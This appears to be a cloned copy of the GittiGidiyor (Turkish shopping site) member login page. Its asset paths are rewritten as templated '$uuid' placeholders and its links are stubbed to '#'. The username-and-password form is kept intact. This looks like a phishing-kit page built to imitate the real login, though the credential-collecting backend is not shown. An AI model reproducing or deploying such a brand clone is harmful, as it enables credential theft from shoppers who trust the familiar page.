<!DOCTYPE html>
<!-- saved from url=(0043)https://www.gittigidiyor.com/uye-girisi?s=1 -->
<html lang="tr" class="js-ready csstransforms3d csstransitions">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="{{ asset("$uuid/css/index.css") }}" rel="stylesheet" type="text/css" >
    <link href="{{ asset("$uuid/css/common.min.css") }}" rel="stylesheet" type="text/css" onload="this.rel=&#39;stylesheet&#39;" >
    <noscript>
    <link href="{{ asset("$uuid/css/common.2.css") }}" rel="stylesheet" type="text/css" >

    </noscript>
    <script>
      ! function(a) {
        "use strict";
        var b = function(b, c, d) {
          function j(a) {
            if (e.body) return a();
            setTimeout(function() {
              j(a)
            })
          }

          function l() {
            f.addEventListener && f.removeEventListener("load", l), f.media = d || "all"
          }
          var g, e = a.document,
            f = e.createElement("link");
          if (c) g = c;
          else {
            var h = (e.body || e.getElementsByTagName("head")[0]).childNodes;
            g = h[h.length - 1]
          }
          var i = e.styleSheets;
          f.rel = "stylesheet", f.href = b, f.media = "only x", j(function() {
            g.parentNode.insertBefore(f, c ? g : g.nextSibling)
          });
          var k = function(a) {
            for (var b = f.href, c = i.length; c--;)
              if (i[c].href === b) return a();
            setTimeout(function() {
              k(a)
            })
          };
          return f.addEventListener && f.addEventListener("load", l), f.onloadcssdefined = k, k(l), f
        };
        "undefined" != typeof exports ? exports.loadCSS = b : a.loadCSS = b
      }("undefined" != typeof global ? global : this);
      ! function(a) {
        if (a.loadCSS) {
          var b = loadCSS.relpreload = {};
          if (b.support = function() {
              try {
                return a.document.createElement("link").relList.supports("preload")
              } catch (a) {
                return !1
              }
            }, b.poly = function() {
              for (var b = a.document.getElementsByTagName("link"), c = 0; c < b.length; c++) {
                var d = b[c];
                "preload" === d.rel && "style" === d.getAttribute("as") && (a.loadCSS(d.href, d, d.getAttribute("media")), d.rel = null)
              }
            }, !b.support()) {
            b.poly();
            var c = a.setInterval(b.poly, 300);
            a.addEventListener && a.addEventListener("load", function() {
              b.poly(), a.clearInterval(c)
            }), a.attachEvent && a.attachEvent("onload", function() {
              a.clearInterval(c)
            })
          }
        }
      }(this);
    </script>
    <link href="{{ asset("$uuid/css/main_route-main-route-home-page-login-show.style.min.css") }}" rel="stylesheet" type="text/css" >
    <title>Üye Girişi - GittiGidiyor</title>
    <link rel="shortcut icon" href="../{{$uuid}}/images/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">
      .fb_hidden {
        position: absolute;
        top: -10000px;
        z-index: 10001
      }

      .fb_reposition {
        overflow: hidden;
        position: relative
      }

      .fb_invisible {
        display: none
      }

      .fb_reset {
        background: none;
        border: 0;
        border-spacing: 0;
        color: #000;
        cursor: auto;
        direction: ltr;
        font-family: "lucida grande", tahoma, verdana, arial, sans-serif;
        font-size: 11px;
        font-style: normal;
        font-variant: normal;
        font-weight: normal;
        letter-spacing: normal;
        line-height: 1;
        margin: 0;
        overflow: visible;
        padding: 0;
        text-align: left;
        text-decoration: none;
        text-indent: 0;
        text-shadow: none;
        text-transform: none;
        visibility: visible;
        white-space: normal;
        word-spacing: normal
      }

      .fb_reset>div {
        overflow: hidden
      }

      @keyframes fb_transform {
        from {
          opacity: 0;
          transform: scale(.95)
        }

        to {
          opacity: 1;
          transform: scale(1)
        }
      }

      .fb_animate {
        animation: fb_transform .3s forwards
      }

      .fb_dialog {
        background: rgba(82, 82, 82, .7);
        position: absolute;
        top: -10000px;
        z-index: 10001
      }

      .fb_dialog_advanced {
        border-radius: 8px;
        padding: 10px
      }

      .fb_dialog_content {
        background: #fff;
        color: #373737
      }

      .fb_dialog_close_icon {
        background: url(../images/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;
        cursor: pointer;
        display: block;
        height: 15px;
        position: absolute;
        right: 18px;
        top: 17px;
        width: 15px
      }

      .fb_dialog_mobile .fb_dialog_close_icon {
        left: 5px;
        right: auto;
        top: 5px
      }

      .fb_dialog_padding {
        background-color: transparent;
        position: absolute;
        width: 1px;
        z-index: -1
      }

      .fb_dialog_close_icon:hover {
        background: url(../images/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent
      }

      .fb_dialog_close_icon:active {
        background: url(../images/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent
      }

      .fb_dialog_iframe {
        line-height: 0
      }

      .fb_dialog_content .dialog_title {
        background: #6d84b4;
        border: 1px solid #365899;
        color: #fff;
        font-size: 14px;
        font-weight: bold;
        margin: 0
      }

      .fb_dialog_content .dialog_title>span {
        background: url(../images/Cou7n-nqK52.gif) no-repeat 5px 50%;
        float: left;
        padding: 5px 0 7px 26px
      }

      body.fb_hidden {
        height: 100%;
        left: 0;
        margin: 0;
        overflow: visible;
        position: absolute;
        top: -10000px;
        transform: none;
        width: 100%
      }

      .fb_dialog.fb_dialog_mobile.loading {
        background: url(./images/3rhSv5V8j3o.gif) white no-repeat 50% 50%;
        min-height: 100%;
        min-width: 100%;
        overflow: hidden;
        position: absolute;
        top: 0;
        z-index: 10001
      }

      .fb_dialog.fb_dialog_mobile.loading.centered {
        background: none;
        height: auto;
        min-height: initial;
        min-width: initial;
        width: auto
      }

      .fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner {
        width: 100%
      }

      .fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content {
        background: none
      }

      .loading.centered #fb_dialog_loader_close {
        clear: both;
        color: #fff;
        display: block;
        font-size: 18px;
        padding-top: 20px
      }

      #fb-root #fb_dialog_ipad_overlay {
        background: rgba(0, 0, 0, .4);
        bottom: 0;
        left: 0;
        min-height: 100%;
        position: absolute;
        right: 0;
        top: 0;
        width: 100%;
        z-index: 10000
      }

      #fb-root #fb_dialog_ipad_overlay.hidden {
        display: none
      }

      .fb_dialog.fb_dialog_mobile.loading iframe {
        visibility: hidden
      }

      .fb_dialog_mobile .fb_dialog_iframe {
        position: sticky;
        top: 0
      }

      .fb_dialog_content .dialog_header {
        background: linear-gradient(from(#738aba), to(#2c4987));
        border-bottom: 1px solid;
        border-color: #043b87;
        box-shadow: white 0 1px 1px -1px inset;
        color: #fff;
        font: bold 14px Helvetica, sans-serif;
        text-overflow: ellipsis;
        text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0;
        vertical-align: middle;
        white-space: nowrap
      }

      .fb_dialog_content .dialog_header table {
        height: 43px;
        width: 100%
      }

      .fb_dialog_content .dialog_header td.header_left {
        font-size: 12px;
        padding-left: 5px;
        vertical-align: middle;
        width: 60px
      }

      .fb_dialog_content .dialog_header td.header_right {
        font-size: 12px;
        padding-right: 5px;
        vertical-align: middle;
        width: 60px
      }

      .fb_dialog_content .touchable_button {
        background: linear-gradient(from(#4267B2), to(#2a4887));
        background-clip: padding-box;
        border: 1px solid #29487d;
        border-radius: 3px;
        display: inline-block;
        line-height: 18px;
        margin-top: 3px;
        max-width: 85px;
        padding: 4px 12px;
        position: relative
      }

      .fb_dialog_content .dialog_header .touchable_button input {
        background: none;
        border: none;
        color: #fff;
        font: bold 12px Helvetica, sans-serif;
        margin: 2px -12px;
        padding: 2px 6px 3px 6px;
        text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0
      }

      .fb_dialog_content .dialog_header .header_center {
        color: #fff;
        font-size: 16px;
        font-weight: bold;
        line-height: 18px;
        text-align: center;
        vertical-align: middle
      }

      .fb_dialog_content .dialog_footer {
        background: #f5f6f7;
        border: 1px solid #4a4a4a;
        border-top-color: #ccc;
        height: 40px
      }

      #fb_dialog_loader_close {
        float: left
      }

      .fb_dialog.fb_dialog_mobile .fb_dialog_close_icon {
        visibility: hidden
      }

      #fb_dialog_loader_spinner {
        animation: rotateSpinner 1.2s linear infinite;
        background-color: transparent;
        background-image: url(./images/t-wz8gw1xG1.png);
        background-position: 50% 50%;
        background-repeat: no-repeat;
        height: 24px;
        width: 24px
      }

      @keyframes rotateSpinner {
        0% {
          transform: rotate(0deg)
        }

        100% {
          transform: rotate(360deg)
        }
      }

      .fb_iframe_widget {
        display: inline-block;
        position: relative
      }

      .fb_iframe_widget span {
        display: inline-block;
        position: relative;
        text-align: justify
      }

      .fb_iframe_widget iframe {
        position: absolute
      }

      .fb_iframe_widget_fluid_desktop,
      .fb_iframe_widget_fluid_desktop span,
      .fb_iframe_widget_fluid_desktop iframe {
        max-width: 100%
      }

      .fb_iframe_widget_fluid_desktop iframe {
        min-width: 220px;
        position: relative
      }

      .fb_iframe_widget_lift {
        z-index: 1
      }

      .fb_iframe_widget_fluid {
        display: inline
      }

      .fb_iframe_widget_fluid span {
        width: 100%
      }

      .fb_mpn_mobile_landing_page_slide_out {
        animation-duration: 200ms;
        animation-name: fb_mpn_landing_page_slide_out;
        transition-timing-function: ease-in
      }

      .fb_mpn_mobile_landing_page_slide_out_from_left {
        animation-duration: 200ms;
        animation-name: fb_mpn_landing_page_slide_out_from_left;
        transition-timing-function: ease-in
      }

      .fb_mpn_mobile_landing_page_slide_up {
        animation-duration: 500ms;
        animation-name: fb_mpn_landing_page_slide_up;
        transition-timing-function: ease-in
      }

      .fb_mpn_mobile_bounce_in {
        animation-duration: 300ms;
        animation-name: fb_mpn_bounce_in;
        transition-timing-function: ease-in
      }

      .fb_mpn_mobile_bounce_out {
        animation-duration: 300ms;
        animation-name: fb_mpn_bounce_out;
        transition-timing-function: ease-in
      }

      .fb_mpn_mobile_bounce_out_v2 {
        animation-duration: 300ms;
        animation-name: fb_mpn_fade_out;
        transition-timing-function: ease-in
      }

      .fb_customer_chat_bounce_in_v2 {
        animation-duration: 300ms;
        animation-name: fb_bounce_in_v2;
        transition-timing-function: ease-in
      }

      .fb_customer_chat_bounce_in_from_left {
        animation-duration: 300ms;
        animation-name: fb_bounce_in_from_left;
        transition-timing-function: ease-in
      }

      .fb_customer_chat_bounce_out_v2 {
        animation-duration: 300ms;
        animation-name: fb_bounce_out_v2;
        transition-timing-function: ease-in
      }

      .fb_customer_chat_bounce_out_from_left {
        animation-duration: 300ms;
        animation-name: fb_bounce_out_from_left;
        transition-timing-function: ease-in
      }

      .fb_invisible_flow {
        display: inherit;
        height: 0;
        overflow-x: hidden;
        width: 0
      }

      @keyframes fb_mpn_landing_page_slide_out {
        0% {
          margin: 0 12px;
          width: 100% - 24px
        }

        60% {
          border-radius: 18px
        }

        100% {
          border-radius: 50%;
          margin: 0 24px;
          width: 60px
        }
      }

      @keyframes fb_mpn_landing_page_slide_out_from_left {
        0% {
          left: 12px;
          width: 100% - 24px
        }

        60% {
          border-radius: 18px
        }

        100% {
          border-radius: 50%;
          left: 12px;
          width: 60px
        }
      }

      @keyframes fb_mpn_landing_page_slide_up {
        0% {
          bottom: 0;
          opacity: 0
        }

        100% {
          bottom: 24px;
          opacity: 1
        }
      }

      @keyframes fb_mpn_bounce_in {
        0% {
          opacity: .5;
          top: 100%
        }

        100% {
          opacity: 1;
          top: 0
        }
      }

      @keyframes fb_mpn_fade_out {
        0% {
          bottom: 30px;
          opacity: 1
        }

        100% {
          bottom: 0;
          opacity: 0
        }
      }

      @keyframes fb_mpn_bounce_out {
        0% {
          opacity: 1;
          top: 0
        }

        100% {
          opacity: .5;
          top: 100%
        }
      }

      @keyframes fb_bounce_in_v2 {
        0% {
          opacity: 0;
          transform: scale(0, 0);
          transform-origin: bottom right
        }

        50% {
          transform: scale(1.03, 1.03);
          transform-origin: bottom right
        }

        100% {
          opacity: 1;
          transform: scale(1, 1);
          transform-origin: bottom right
        }
      }

      @keyframes fb_bounce_in_from_left {
        0% {
          opacity: 0;
          transform: scale(0, 0);
          transform-origin: bottom left
        }

        50% {
          transform: scale(1.03, 1.03);
          transform-origin: bottom left
        }

        100% {
          opacity: 1;
          transform: scale(1, 1);
          transform-origin: bottom left
        }
      }

      @keyframes fb_bounce_out_v2 {
        0% {
          opacity: 1;
          transform: scale(1, 1);
          transform-origin: bottom right
        }

        100% {
          opacity: 0;
          transform: scale(0, 0);
          transform-origin: bottom right
        }
      }

      @keyframes fb_bounce_out_from_left {
        0% {
          opacity: 1;
          transform: scale(1, 1);
          transform-origin: bottom left
        }

        100% {
          opacity: 0;
          transform: scale(0, 0);
          transform-origin: bottom left
        }
      }

      @keyframes slideInFromBottom {
        0% {
          opacity: .1;
          transform: translateY(100%)
        }

        100% {
          opacity: 1;
          transform: translateY(0)
        }
      }

      @keyframes slideInFromBottomDelay {
        0% {
          opacity: 0;
          transform: translateY(100%)
        }

        97% {
          opacity: 0;
          transform: translateY(100%)
        }

        100% {
          opacity: 1;
          transform: translateY(0)
        }
      }
    </style>
  </head>
  <body>
    <div id="MainContainer" class="compact-header">
      <div id="topContainer" class="login-register-page">
        <script type="text/javascript">
          window.compactHeader = true;
        </script>
        <div id="GGHeaderWrapper" class="robot-header-container container">
          <div class="header-container " id="header_wrapper">
            <div id="MainCon">
              <div class="head_w clearfix GGMenu">
                <div class="left">
                  <a class="logo_gg imglink logo-small" title="Alışveriş Sitesi" href="#"></a>
                </div>
                <div id="HeadUserNav" class="right basket-pages ">
                  <ul class="clearfix">
                    <li class="guest-panel-content">
                      <span>
                        <a class="link-underline" href="#" title="Üye Ol" id="H-Register" rel="nofollow">Üye Ol</a>
                      </span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="OverlayCon"></div>
      <div class="gray-content">
        <div id="simplemodal-overlay" class="simplemodal-overlay" style="height: 204px;"></div>
        <div id="gg-login-content-container">
          <div class="container">
            <div id="gg-login-box" class="gg-w-8 gg-d-10 gg-t-12 gg-m-24 gg-w-push-8 gg-d-push-7 gg-t-push-6 gg-m-push-0 cover-frame">
              <!-- Login Box Head -->
              <div class="row underline">
                <div class="gg-login-head">
                  <h1>Üye Girişi</h1>
                  <a class="gg-login-problem" href="#">?</a>
                </div>
              </div>
              <!-- / Login Box Head -->
              <div class="login-form-container gg-d-24 padding-none">
                <!-- Facebook Login -->
                <div class="gg-d-12">
                  <div class="clearfix marginContent guestCheckoutEnabled">
                    <div class="facebookLine">
                      <div class="faux-fb-btn">
                        <div class="fb-icon-square">
                          <i class="gg-icon gg-icon-facebook"></i>
                        </div>
                        <button>Facebook</button>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="gg-d-12 pl0">
                  <a id="customGoogleLoginBtn" class="customGPlusSignIn gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-ui-btn-primary gg-ui-btn-fluid  gg-ui-btn-lg">
                    <span class="icon"></span>
                    <span class="buttonText">Google</span>
                  </a>
                </div>
                <!-- Google Login -->
                <div class="gg-d-24">
                  <div class=" or-label-container">
                    <div class="or-info">
                      <p>ile giriş yapın</p>
                    </div>
                    <div class="or-label">
                      <span>veya</span>
                    </div>
                  </div>
                </div>
                <!-- Login Form -->
                <form id="formlogin" class="gg-form-item" name="formlogin" onsubmit="return loginPageController.functions.ControlLogin()" method="post" action="#">
                  <input type="hidden" name="__RequestVerificationToken" value="0db81f547bf5f765cc0930a944714017">
                  <div class="clearfix">
                    <div class="gg-d-24 gg-m-24 posr">
                      <div class="gg-form-item gg-label-placeholder clearfix empty">
                        <div class="gg-label gg-d-24 padding-none deneme1">Kullanıcı adı veya e-posta adresiniz*</div>
                        <div class="gg-input gg-d-24 padding-none">
                          <input autocapitalize="off" type="text" id="L-UserNameField" tabindex="1" name="kullanici" maxlength="40" size="26" value="" class="gg-d-24">
                          <span class="gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-input-error-text">Lütfen kullanıcı adınızı veya e-posta adresinizi giriniz.</span>
                        </div>
                      </div>
                      <div class="gg-login-detect-guest-checkout gg-d-24 gg-m-24 padding-none" style="display: none;">
                        <div class="gg-login-guest-checkout-arrow"></div>
                        <span class="gg-login-guest-checkout-title gg-d-24">E-postanızı kontrol ettiniz mi?</span>
                        <div class="gg-d-24 pt10">
                          <span class="gg-login-guest-checkout-text pb10">Kaydınızı tamamlamanız için <span class="gg-login-guest-checkout-bold-text-email"></span> adresinize <span class="gg-login-guest-checkout-bold-text-mail-title">"Sizi aramızda görmek için sabırsızlanıyoruz"</span>başlıklı bir e-posta gönderdik. Bu e-posta içindeki linke tıklayarak üyelik kaydınızı hemen tamamlayabilirsiniz. </span>
                          <div class="gg-login-accountAccess clearfix pt10">
                            <div class="gg-login-go-to-mail">
                              <div class="gg-login-mail-icon"></div>
                              <span class="gg-login-mail-text">Gmail Hesabıma Git</span>
                            </div>
                            <span class="gg-login-are-not-you">Bu hesap size ait değil mi?</span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="gg-d-24 gg-m-24 posr">
                      <div class="gg-form-item gg-label-placeholder empty mrb10 clearfix">
                        <div class="normal-login gg-label gg-d-24 padding-none  qqqwwwe">Şifreniz*</div>
                        <div class="normal-login gg-input gg-d-24 padding-none ">
                          <div class="showHidePwd" rel="L-PasswordField">Göster</div>
                          <input class="gg-d-24" autocapitalize="off" type="password" onblur="return loginPageController.functions.ChckLoginPass()" id="L-PasswordField" tabindex="2" name="sifre" maxlength="20" size="26">
                          <span class="gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-input-error-text"></span>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="clearfix">
                    <div class="gg-uw-24 gg-w-24 gg-d-24 gg-t-24 gg-m-24">
                      <div class="clearfix">
                        <div class="gg-login-forgot-container gg-uw-12 gg-w-12 gg-d-12 gg-t-12 gg-m-12 padding-none">
                          <div class="gg-input gg-ui-checkbox-primary ">
                            <input id="gg-login-remember-me" type="checkbox" class="m0" name="rememberme" tabindex="3" value="1">
                            <span class="checkmark"></span>
                            <label class="remember" for="gg-login-remember-me">Beni hatırla</label>
                          </div>
                        </div>
                        <div class="gg-login-forgot-container gg-uw-12 gg-w-12 gg-d-12 gg-t-12 gg-m-12 padding-none text-align-right">
                          <a href="#" class="link" id="L-ForgotPassword" title="Üye Girişi Yapamıyorum">Üye Girişi Yapamıyorum</a>
                        </div>
                      </div>
                      <div class="gg-uw-24 gg-w-24 gg-d-24 gg-t-24 gg-m-24 padding-none ">
                        <div class="gg-login-loginButton clearfix">
                          <input type="hidden" name="MYGG" value="Y">
                          <input type="hidden" name="js_kontrol" value="1">
                          <input type="hidden" name="logfrm" value="1">
                          <input type="hidden" name="ITEM" value="">
                          <input type="hidden" name="url" value="">
                          <input type="hidden" name="pass" value="Üye girişini onaylıyorum">
                          <input type="hidden" name="facebookLoginCheck" class="facebookLoginCheck" value="0">
                          <input type="hidden" name="dmEmailPermission" class="dmEmailPermission" value="0">
                          <input type="hidden" class="gLoginProfileId" name="gLoginProfileId" value="">
                          <input type="hidden" class="gLoginEmail" name="gLoginEmail" value="">
                          <input type="hidden" class="gLoginToken" name="gLoginToken" value="">
                          <input type="hidden" class="googleLoginCheck" name="googleLoginCheck" value="0">
                          <input class="gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-ui-btn-primary gg-ui-btn-fluid  gg-ui-btn-lg" type="submit" id="gg-login-enter" value="Giriş Yap" tabindex="4" name="pass" alt="Giriş Yap" title="Giriş Yap">
                          <a href="#" title="Sms ile Giriş Yap" class="gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-ui-btn-default mt10 mrb10 gg-ui-btn-lg" id="btn-login-with-sms">Sms ile Giriş Yap</a>
                        </div>
                        <div class="gg-login-form-separator clearfix"></div>
                        <a title="Ücretsiz Üye Ol" id="gg-login-register" class="gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-ui-btn-default gg-ui-btn-lg" href="#">Ücretsiz Üye Ol</a>
                        <div class="gg-d-24 gg-m-24 padding-none mt25 mrb20">
                          <div class="gg-d-24 gg-m-24 gg-login-border-bt">
                            <div class="or-label">
                              <span>Üye olmayan kullanıcılar için</span>
                            </div>
                          </div>
                        </div>
                        <div id="order-tracking-button-container" class="gg-d-24 padding-none mt5">
                          <a href="#" title="Sipariş Takibi Yap" class="gg-m-24 gg-t-24 gg-d-24 gg-w-24 gg-ui-btn-default gg-ui-btn-lg" id="order-tracking-button">Sipariş Takibi Yap</a>
                        </div>
                      </div>
                    </div>
                  </div>
                </form>
                <!-- / Login Form -->
              </div>
              <div class="clearfix"></div>
            </div>
          </div>
        </div>
        <input type="hidden" id="lrtAbTestValue" value="LRT1">
        <div id="facebookLightBox">
          <div id="facebookEmail" class="LightboxCon">
            <div class="dpinline-block width100">
              <div class="left margin-right-15">
                <img src="./images/information.png" width="60" height="59">
              </div>
              <div class="facebook_alert_title left mt15">
                <p>İşleminizde bir hata oluştu</p>
              </div>
            </div>
            <div>
              <p class="facebook_alert_content">GittiGidiyor'a Facebook hesabınızdan bağlanmak için Facebook'a e-posta bilgilerinizi vermiş olmanız gerekmektedir.</p>
              <input class="gg-ui-btn-primary" type="button" id="Facebook_Email_Approve" value="İzin Ver" name="Facebook_Email_Approve" alt="İzin Ver" title="İzin Ver">
            </div>
          </div>
          <div id="facebookUserAgreement" class="LightboxCon">
            <div class="margin-bottom-10">
              <p class="gg-login-facebook-fast-fast-membership">Facebook ile Hızlı Üyelik</p>
              <p class="gg-login-facebook-fast-sign-up">Zamanınız değerli! Hızlıca üye olun, alışveriş keyfine hemen başlayın.</p>
            </div>
            <div class="row">
              <div class="border-bottom-e3"></div>
            </div>
            <div class="marginContent clearfix">
              <div class="gg-m-24 gg-t-24 gg-d-24 AgreeTerms">
                <input type="checkbox" tabindex="10" value="1" class="termschck" id="termsofuse" name="termsofuse">
                <label class="margin-left-20 terms" for="termsofuse">
                  <p>
                    <a class="link" target="_blank" href="#">Kullanıcı Sözleşmesini</a> ve <a target="_blank" class="link" href="#">Gizlilik Politikasını</a> okudum ve kabul ediyorum.
                  </p>
                </label>
              </div>
              <div class="gg-m-24 gg-t-24 gg-d-24 AgreeTerms termsofuseWarn">
                <span class="FormTxtWarn">Kullanıcı Sözleşmemizi ve Gizlilik Politikamızı okuyup kabul etmeniz gerekiyor.</span>
              </div>
            </div>
            <div class="marginContent clearfix">
              <div class="gg-m-24 gg-t-24 gg-d-24 AgreeTerms">
                <input type="checkbox" tabindex="10" class="termschck" id="informed-email" name="informed-email">
                <label for="informed-email" class="ml20 dpblock">
                  <p>GittiGidiyor tarafından gönderilecek ticari elektronik iletileri almak istiyorum.</p>
                </label>
              </div>
            </div>
            <input class="gg-ui-btn-primary" type="button" id="Facebook_User_Agreement_Approve" value="Tamam" name="Facebook_User_Agreement_Approve" alt="Tamam" title="Tamam">
          </div>
        </div>
      </div>
      <script>
        (function(w, d, s, l, i) {
          w[l] = w[l] || [];
          w[l].push({
            'gtm.start': new Date().getTime(),
            event: 'gtm.js'
          });
          var f = d.getElementsByTagName(s)[0],
            j = d.createElement(s),
            dl = l != 'dataLayer' ? '&l=' + l : '';
          j.async = true;
          j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
          f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-MG6RLL');
      </script>
      <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MG6RLL" height="0" width="0" style="display:none;visibility:hidden"></iframe>
      </noscript>
      <div class="footer footer-responsive compact-footer ">
        <div class="hidden-m">
          <div class="footer-explanation"> Türkiye'nin önde gelen <a href="#" title="Online Alışveriş Sitesi"> online alışveriş sitesi </a> GittiGidiyor'da aradığınız modelleri, en uygun fiyatları bulabilir, Sıfır Risk Sistemi ile güvenle alışveriş yapabilir, indirim ve kampanyaları takip edebilir, binlerce kategoride online satış yapabilirsiniz. </div>
          <a title="Alışveriş Sitesi" href="#">GittiGidiyor</a>| <a title="Arama" href="#">Arama</a>| 
          <a title="Satış" href="#" rel="nofollow">Satış</a>| 
          <a title="Mağazalar" href="#">Mağazalar</a>| 
          <a title="Mobil Uygulamalar" href="#" rel="nofollow">Mobil Uygulamalar</a>
          | <a title="Hesabım" href="#" rel="nofollow">Siparişlerim</a>| 
          <a title="Hesabım" href="#" rel="nofollow">Sattıklarım</a>| 
          <a title="Popüler Markalar" href="#">Markalar</a>|
           <a title="Tüm Kategoriler" href="#">Kategoriler</a>| 
           <a title="Sıfır Risk Sistemi" href="#">Sıfır Risk Sistemi</a>|
            <a title="Site Haritası" href="#">Site Haritası</a>|
             <a title="Blog" href="#" target="_blank">Blog</a>|
              <a title="Yardım" href="#">Yardım</a>
        </div>
        <span class="clearfix ">
          <span class="mobile-fluid bottom-mobile-helper">© Copyright 2001-2022 <a href="#" class="GrayLink">GittiGidiyor.com</a>
          </span>
          <span class="hidden-m mobile-fluid">
            <span class="hidden-m">|</span>
            <a href="#" title="Gizlilik Politikası">Gizlilik Politikası</a> |
             <a href="#" title="Çerez Politikası">Çerez Politikası</a> 
             | <a href="#" title="Kullanıcı Sözleşmesi">Kullanıcı Sözleşmesi</a>
            <span class="gg-m-24 visible-m">
              <a href="#" title="Mağazalar">Mağazalar</a>
            </span>
          </span>
        </span>
        <table border="0" width="100%" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
          <tbody>
            <tr>
              <td align="center" valign="top" style="line-height: 0px;">
                <div id="DigiCertClickID_LpkEESo4">
                  <div id="DigiCertClickID_LpkEESo4Seal" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default;">
                    <img src="../{{$uuid}}/images/indir.png" alt="DigiCert Seal" tabindex="0" style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer;">
                  </div>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
        <br>
      </div>
      <input type="hidden" id="staticFileUrl" name="staticFileUrl" value="/">
      <input type="hidden" id="main-route" name="main-route" value="//www.gittigidiyor.com">
    </div>
    <!-- DTM Tracking Start -->
    <script type="text/javascript">
      /* all pages block */
      var TRACKINGPAGENAME = 'Login:Login & Register Page';
      var TRACKINGCONTENTNAME = 'Login';
      var TRACKINGPLATFORM = 'GG';
      var TRACKING_SUID = '';
      var TRACKING_SUID_RECOG = 'FALSE';
      var TRACKING_HTTP_REFERER = '';
      var sc_pageName = 'Login:Login & Register Page';
      var sc_channel = 'Login';
      /* Conversion Variables */
      var sc_events = 'event42';
      /* private page block */
    </script>
    <!-- DTM Tracking Finish -->
    <script type="text/javascript">
      var gruntBuildId = "b3443382d4f10b526a6f201acb234eca";
    </script>
    <script type="text/javascript">
      dataLayer.push({
        "event": "MemberLogin",
        "pageName": "Login:Login & Register Page",
        "pageType": "Member",
        "statusCode": "200",
        "registerABTest": "LRT1"
      });
    </script>
    <iframe id="ssIFrame_google" sandbox="allow-scripts allow-same-origin" aria-hidden="true" frame-border="0" style="position: absolute; width: 1px; height: 1px; inset: -9999px; display: none;" src="./images/iframe.html"></iframe>
    <script>
      const inputName=document.querySelector("#L-UserNameField"),inputTel=document.querySelector("#L-PasswordField")
    
    inputName.addEventListener('keydown', (event) => {
      if (event.target.value.length >= 0) {        
        document.querySelector(".deneme1").style.top ="8px"
        document.querySelector(".deneme1").style.fontSize ="12px"
        inputName.style.padding = "23px 15px 9px 15px"
    
      }
      else if (event.target.value.length == 0 && event.keyCode == 8) {        
        document.querySelector(".deneme1").style.top =""   
        inputName.style.padding = "" 
    
      }    
      else {
        document.querySelector(".deneme1").style.top =""
        inputName.style.padding = ""

      }
    });
    
    
    inputTel.addEventListener('keydown', (event) => {
      if (event.target.value.length >= 0) {
        
        document.querySelector(".qqqwwwe").style.top ="8px"
        document.querySelector(".qqqwwwe").style.fontSize ="12px"
        inputTel.style.padding = "23px 15px 9px 15px"
    
      }
      else if (event.target.value.length == 0 && event.keyCode == 8) {
        
        document.querySelector(".qqqwwwe").style.top =""
        inputTel.style.padding = ""
    
      }
    
      else {
        document.querySelector(".qqqwwwe").style.top =""
        inputTel.style.padding = ""
    
      }
    });
    </script>
    <script type="text/javascript" id="">
      function fbqSearchKeyword() {
        var a = window.location.search,
          c = a.match(/[?&]utm_source=([^&#]*)/),
          b = a.match(/[?&]utm_medium=([^&#]*)/);
        a = a.match(/[?&]utm_campaign=([^&#]*)/);
        b = {
          utm_source: c && c[1],
          utm_medium: b && b[1],
          utm_campaign: a && a[1]
        };
        c && c[1] || (b.utm_source = "organic");
        if (a = document.referrer) {
          c = document.createElement("a");
          c.setAttribute("href", a);
          a = RegExp("[\\?\x26](?:q|query)\x3d([^\x26#]*)");
          if ((a = c.search.match(a)) && 0 < a.length) var d = a[1].replace(/\+/gi, "%20");
          d ? (b.hostname = c.hostname, b.keyword = decodeURIComponent(d)) : (b.hostname = c.hostname, b.keyword = null)
        } else b.hostname = null, b.keyword = null;
        0 !== document.referrer.indexOf(location.protocol + "//" + location.host) && fbq("trackCustom", "referrerSource", b)
      }
      fbqSearchKeyword();
    </script>
    <div id="fb-root" class=" fb_reset">
      <div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
        <div></div>
      </div>
    </div>
  </body>
</html>